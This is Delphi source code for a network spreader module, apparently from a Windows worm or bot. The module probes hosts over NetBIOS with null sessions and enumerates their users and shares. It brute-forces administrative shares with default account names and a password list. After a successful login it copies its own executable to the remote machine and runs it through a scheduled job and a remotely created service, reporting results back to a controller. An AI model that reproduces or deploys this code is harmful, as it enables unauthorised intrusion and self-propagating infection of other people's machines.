unit Netbios;
interface

// Nt Spreader, Quite (No Auth and Null - they are comabined) Unstable - To be tested. ( i suppose the scanner will take alot of memory due making 2 string list for each threa)
// tested on network - working .

Procedure NetBiosStart(host:string);

implementation

Uses Stuff,
     Classes,
     Windows,
     sysutils,
     config,
     nt,
     password,
     winsvc;

Const
    names : array [1..7] of string = ('administrator','administrateur','admin','guest','user','webmaster','TsInternetUser');
    sharesX:array[1..5] of string = ('c$','d$','e$','f$','admin$');

Type
  NetBioss = class(TThread)
  Private
    Shares,Users:TStringList;
    temphost,tempshare:string;
    nw :TNetResource;
  protected
    constructor Create(host:string);
    procedure Execute; override;
    Procedure StartViaService;
    Procedure MuiltiSession();
   end;

  constructor netbioss.Create(host:string);
    begin
      inherited Create(false);
      FreeOnTerminate := True;
      temphost:=host;
    end;

{ ** // for debugging
function NetErrorStr(dwNetError: DWORD): string;
Begin
  Case dwNetError Of
  ERROR_ACCESS_DENIED:Result:='The caller does not have access to the network resource.';
  ERROR_ALREADY_ASSIGNED:Result:='The local device specified by the lpLocalName member is already connected to a network resource.';
  ERROR_BAD_DEV_TYPE:Result:='The type of local device and the type of network resource do not match.';
  ERROR_BAD_DEVICE:Result:='The value specified by lpLocalName is invalid.';
  ERROR_BAD_NET_NAME:Result:='The value specified by the lpRemoteName member is not acceptable to any network resource provider, either because the resource name is invalid, or because the named resource cannot be located. ';
  ERROR_BAD_PROFILE:Result:='The user profile is in an incorrect format.';
  ERROR_BAD_PROVIDER:Result:='The value specified by the lpProvider member does not match any provider.';
  ERROR_BUSY:Result:='The router or provider is busy, possibly initializing. The caller should retry. ';
  ERROR_CANCELLED :Result:='The attempt to make the connection was cancelled by the user through a dialog box from one of the network resource providers, or by a called resource. ';
  ERROR_CANNOT_OPEN_PROFILE:Result:='The system is unable to open the user profile to process persistent connections.';
  ERROR_DEVICE_ALREADY_REMEMBERED:Result:='An entry for the device specified by lpLocalName is already in the user profile. ';
  ERROR_EXTENDED_ERROR:Result:='A network-specific error occurred. Call the WNetGetLastError function to obtain a description of the error. ';
  ERROR_INVALID_PASSWORD:Result:='The specified password is invalid and the CONNECT_INTERACTIVE flag is not set.';
  ERROR_NO_NET_OR_BAD_PATH:Result:='The operation cannot be performed because a network component is not started or because a specified name cannot be used. ';
  ERROR_NO_NETWORK:Result:='The network is unavailable.';
  ERROR_LOGON_FAILURE:Result:='Logon failure: unknown user name or bad password.';
  ERROR_SESSION_CREDENTIAL_CONFLICT:result:='Multiple connections to a server or shared resource by the same user, using more than one user name, are not allowed. Disconnect all previous connections to the server or shared resource and try again.';
  ERROR_BAD_NETPATH:result:='The network path was not found.';
  ERROR_DATABASE_DOES_NOT_EXIST:result:='The specified database does not exist.';
  ERROR_INVALID_PARAMETER:result:='A specified parameter is invalid.';
End;
end;
}

Procedure NetBioss.StartViaService;
var
  fSvc: Integer;
  fSvcMgr: Integer;
  fRemoteServer: pchar;
  fServiceName: string;
  fLoadGroup: string;
  lpServiceArgVectors: PChar;
  PTag: pointer;
begin
  fSvc := 0;
  PTag := nil;
  fServiceName := '\\'+temphost+'\'+TempShare+'\'+ExtractFileName(ParamStr(0));
  fRemoteServer :=pchar('\\'+temphost);
  fSvcMgr := OpenSCManager(fRemoteServer, SERVICES_ACTIVE_DATABASE,SC_MANAGER_ALL_ACCESS);  if fSvcMgr <> 0 then
  try
    SendSock('[NetBios] Connected To Remote SC MGR: '+temphost);
    fSvc := OpenService(fSvcMgr, 'scrserv',SERVICE_ALL_ACCESS);
    if fSvc = 0 then
    begin
      fSvc := CreateService(fSvcMgr, 'scrserv','scrserv',
      SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS or
      SERVICE_INTERACTIVE_PROCESS,SERVICE_DEMAND_START,
      SERVICE_ERROR_NORMAL,
      pchar(fServiceName), pchar(fLoadGroup), PTag, nil,
      nil,nil);
      if fSvc = 0 then
        SendSock('[NetBios] Cannot Create A Service on: '+temphost+'\'+tempshare);
    end;
    lpServiceArgVectors := nil;
    SendSock('[NetBios] Start Service attempt on: '+temphost);
    if not StartService(fSvc, 0, lpServiceArgVectors) then
      DeleteService(fSvc);
  finally
    if fSvc <> 0 then
      CloseServiceHandle(fSvc);
    CloseServiceHandle(fSvcMgr);
  end
end;

Procedure NetBioss.MuiltiSession();
var i,x,t,ret,o:integer;
  sCopy,Flag:boolean;
  TempShares:TstringList;
begin
Flag:=false;
if Shares.Count < 1 Then
begin
  Shares.Clear;
  for I:=1 to length(sharesx) do
  Shares.Add(SharesX[i]);
end;
if Users.Count < 1 Then
begin
  Users.Clear;
  For I:=1 to length(names) do
  Users.Add(names[i]);
end;

begin
  for i:=0 to Shares.Count -1 do
  begin
    sleep(0);
    If i >= Shares.Count then exit;
    nw.dwType := RESOURCETYPE_DISK;
    nw.lpLocalName := nil;
    nw.lpRemoteName := PChar('\\' + temphost +'\'+Shares[i]);
    nw.lpProvider := nil;
    for x:=0 to Users.Count -1 do
      for t:=1 to length(pwds) do
      begin
        sleep(0);
        ret:=WNetAddConnection2(nw,PChar(pwds[t]),PChar(users[x]),0);
          if ret = NO_ERROR then
          begin
            SendSock('[NETBIOS] Found: '+temphost+'\'+Shares[i] +' '+users[x]+'/'+pwds[t]);
            sCopy:=CopyFileEx(pchar(paramstr(0)), pchar('\\'+temphost+'\'+shares[i]+'\'+ExtractFileName(ParamStr(0))),nil, nil, nil, 0);
            if Scopy then
            begin
              if NetScheduleJobDO('\\'+temphost,'\\'+temphost+'\'+Shares[i]+'\'+ExtractFileName(ParamStr(0)),2) then
                SendSock('[NETBIOS] Started Via NetSchedule: '+temphost);
              tempshare:=Shares[i];
              StartViaService;
            end;
            // Chk Shares
            If not flag then
            begin
              tempshares:=tstringlist.Create;
              GetShares('\\'+temphost,TempShares);
              if TempShares.Count > 0 then
              begin
                flag:=true;
                for o:=0 to TempShares.Count-1 do
                  if Shares.IndexOf(TempShares[o]) = -1 then Shares.Add(TempShares[o]);
                for o:=1 to length(sharesx) do
                  if TempShares.IndexOf(Sharesx[o]) = -1 then Shares.Delete(Shares.IndexOf(Sharesx[o]));
                tempshares.Free;
              end;
            end;
            WNetCancelConnection2(nw.lpRemoteName,connect_update_profile,true);
            // Go renew
          end;
          //writeln(Neterrorstr(ret));
      end;
    end;
end
end;

Procedure NetBioss.execute;
var
  flag:boolean;
  ret:integer;
begin
  nw.dwType:=RESOURCETYPE_ANY;
  nw.lpRemoteName:=pChar('\\' + temphost + '\IPC$');
  ret:=WNetAddConnection2(nw,'','',0);
  if ret = NO_ERROR then
  begin
    SendSock('[NetBios]: \\'+temphost+' null session established.');
    Users:=Tstringlist.Create;
    Shares:=Tstringlist.Create;
    GetUsers('\\'+temphost,Users);
    GetShares('\\'+temphost,Shares);
    WNetCancelConnection2(nw.lpRemoteName,Connect_update_profile,true);
    MuiltiSession;
  end
  else
    begin
      SendSock('[NetBios]: \\'+temphost+' null session failed.');
      WNetCancelConnection2(nw.lpRemoteName,Connect_update_profile,true);
      MuiltiSession;
    end;
  Users.Free;
  Shares.Free;
  Terminate;
end;

  Procedure NetBiosStart(host:string);
    Var i:NetBioss;
    begin
    i:=NetBioss.Create(host);
    end;
end.
